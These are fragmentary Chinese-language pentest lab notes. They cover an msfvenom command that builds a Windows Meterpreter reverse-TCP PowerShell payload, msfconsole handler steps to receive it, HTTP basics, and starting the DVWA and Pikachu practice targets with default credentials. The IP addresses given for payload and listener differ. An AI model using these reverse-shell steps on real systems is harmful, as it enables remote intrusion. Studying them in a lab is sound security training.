...
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.72.129 LPORT=6688 -f psh-reflection > 1.ps1
  ...
  接收木马：msfconsole
            ...
            set LHOST 192.168.72.130   # 这里填你Kali的IP
            set LPORT 6688             # 这里填你Payload里的端口
            run
...
HTTP/1.1：
   请求报文：  方法 URL 版本   ---请求行
              ...
              请求内容
      方法：![alt text](image-1.png)
      响应状态码：![alt text](image-2.png)
案例：关于账号密码：用户枚举，弱口令漏洞，信息密码泄露漏洞
靶场：sudo systemctl start apache2
      sudo systemctl start mariadb
      浏览器：http://localhost/dvwa                http://localhost/pikachu
      admin / password
验证码：